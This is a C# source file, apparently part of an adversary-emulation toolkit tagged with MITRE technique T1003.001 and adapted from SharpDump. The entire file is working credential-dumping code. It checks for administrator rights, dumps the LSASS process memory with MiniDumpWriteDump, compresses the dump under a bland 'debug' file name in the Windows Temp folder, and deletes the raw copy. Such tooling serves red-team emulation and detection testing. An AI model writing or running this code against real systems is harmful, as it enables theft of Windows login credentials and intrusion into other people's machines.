using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Channels;
using System.Security.Principal;

/*
 *  T1003 - 001 - This code is modified version of SharpDump from @HarmJ0y and @Cnotin, full credits to them! =D
 */

class Technique {
	public static Dictionary<string, string> EntryData { get; set; }
	public static Dictionary<string, string> ExitData { get; set; } 

    [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
    static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

    public static bool IsHighIntegrity() {

        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    public static void Compress(string inFile, string outFile) {
        try {
            if (File.Exists(outFile)) {
                Console.WriteLine("[T1003-001] Output file '{0}' already exists, removing", outFile);
                File.Delete(outFile);
            }

            var bytes = File.ReadAllBytes(inFile);
            using (FileStream fs = new FileStream(outFile, FileMode.CreateNew)) {
                using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false)) {
                    zipStream.Write(bytes, 0, bytes.Length);
                }
            }
        }
        catch (Exception ex) {
            Console.WriteLine("[T1003-001] Exception while compressing file: {0}", ex.Message);
        }
    }

    public static void Minidump(string dumpDir) {

        int pid = -1;
        IntPtr targetProcessHandle = IntPtr.Zero;
        uint targetProcessId = 0;
        ExitData = new Dictionary<string, string>();

        Process targetProcess = null;
        Process[] processes = Process.GetProcessesByName("lsass");
        targetProcess = processes[0];

        if (targetProcess.ProcessName == "lsass" && !IsHighIntegrity()) {
            Console.WriteLine("[T1003-001] Not in high integrity, unable to MiniDump!\n");
            return;
        }

        try {
            targetProcessId = (uint)targetProcess.Id;
            targetProcessHandle = targetProcess.Handle;
        }
        catch (Exception ex) {
            Console.WriteLine(String.Format("[T1003-001] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
            return;
        }
        bool bRet = false;

        string dumpFile = String.Format(@"{0}debug{1}.out", dumpDir, targetProcessId);
        string zipFile = String.Format(@"{0}debug{1}.bin", dumpDir, targetProcessId);

        Console.WriteLine(String.Format("[T1003-001] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));

        using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write)) {
            try {
                bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            } catch (Exception ex) {
                Console.WriteLine(ex);
			}
            
        }

        if (bRet) {
            Console.WriteLine("[T1003-001] Dump successful!");
            Console.WriteLine(String.Format("[T1003-001] Compressing {0} to {1} gzip file", dumpFile, zipFile));

            Compress(dumpFile, zipFile);

            Console.WriteLine(String.Format("[T1003-001] Deleting {0}", dumpFile));
            File.Delete(dumpFile);
            Console.WriteLine("[T1003-001] Dumping completed.");

            string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            string OS = "";
            var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
            if (regKey != null) {
                OS = String.Format("{0}", regKey.GetValue("ProductName"));
            }

            if (pid == -1) {
                Console.WriteLine(String.Format("[T1003-001] Operating System : {0}", OS));
                Console.WriteLine(String.Format("[T1003-001] Architecture     : {0}", arch));
            }

            ExitData["returncode"] = "0";
            ExitData["returnmessage"] = "Dump was successful";
        }
        else {
            Console.WriteLine(String.Format("[T1003-001] Dump failed: {0}", bRet));
            ExitData["returncode"] = "1";
            ExitData["returnmessage"] = String.Format("Dump failed: {0}", bRet);
        }
    }

    public static void Main(string[] args) {

        string dumpDir = "";
        if (args.Length >= 1 && Directory.Exists(args[0])) {
            dumpDir = args[0];
        } else {
            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            dumpDir = String.Format("{0}\\Temp\\", systemRoot);
        }
       
        Console.WriteLine("[T1003-001] Starting LSASS dump to '{0}'...", dumpDir);

        if (!Directory.Exists(dumpDir)) {
            Console.WriteLine(String.Format("[T1003-001] [X] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
            return;
        }


        Minidump(dumpDir);

    }
}

